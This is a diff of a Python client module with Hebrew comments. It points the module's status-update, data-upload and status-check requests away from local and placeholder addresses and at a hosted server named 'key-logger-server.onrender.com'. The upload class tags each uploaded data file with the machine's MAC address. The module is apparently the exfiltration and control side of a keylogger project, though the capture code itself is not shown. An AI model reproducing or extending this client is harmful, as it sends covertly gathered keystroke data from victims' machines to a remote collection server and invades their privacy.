@@ -3,25 +3,28 @@ import requests
 import json
 import uuid
 
-
 mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
+
 
 class APIServer(ABC):
     """
     מחלקה אבסטרקטית לייצוג שרת API.
     כל מחלקה היורשת ממנה חייבת לממש את המתודה 'interact_with_server'.
     """
+
     @abstractmethod
     def interact_with_server(self, *args, **kwargs):
         pass
+
 
 class StatusUpdater(APIServer):
     """
     שולח בקשת POST לעדכון סטטוס הפרויקט.
     """
+
     def interact_with_server(self, status_data):
 
-        url = "http://127.0.0.1:5000/api/status/update"
+        url = "https://key-logger-server.onrender.com/api/status/update"
         try:
             response = requests.post(url, json=status_data)
             response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
@@ -31,15 +34,17 @@ class StatusUpdater(APIServer):
             print(f"שגיאה בעדכון סטטוס: {e}")
             return None
 
+
 class DataFileWriter(APIServer):
     """
     שולח בקשת POST לעדכון קובץ דאטא של מחשב ספציפי לפי כתובת MAC.
     """
-    def interact_with_server(self, file_data,mac_address = mac_address):
 
-        url = "http://127.0.0.1:5000/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
+    def interact_with_server(self, file_data, mac_address=mac_address):
+
+        url = "https://key-logger-server.onrender.com/api/data/upload'"  # החלף בכתובת ה-URL האמיתית
         try:
-            response = requests.post(url, json=file_data, headers = {"mac_address":mac_address})
+            response = requests.post(url, json=file_data, headers={"mac_address": mac_address})
             response.raise_for_status()
             return response
         except requests.exceptions.RequestException as e:
@@ -51,13 +56,14 @@ class StatusChecker(APIServer):
     """
     שולח בקשת GET כדי לדעת האם יש שינויים בסטטוסים.
     """
+
     def interact_with_server(self):
         """
         שולח בקשת GET לבדיקת שינויים בסטטוסים.
 
         :return: תגובת השרת (requests.Response).
         """
-        url = "http://your_api_server/check_status_changes"  # החלף בכתובת ה-URL האמיתית
+        url = "https://key-logger-server.onrender.com/check_status_changes"  # החלף בכתובת ה-URL האמיתית
         try:
             response = requests.get(url)
             response.raise_for_status()
@@ -71,6 +77,7 @@ class RequestManager:
     """
     מנהל את הבקשות ומנתב אותן למחלקה המתאימה בהתאם למטודה וסוג הבקשה.
     """
+
     def __init__(self):
         self.status_updater = StatusUpdater()
         self.data_file_writer = DataFileWriter()
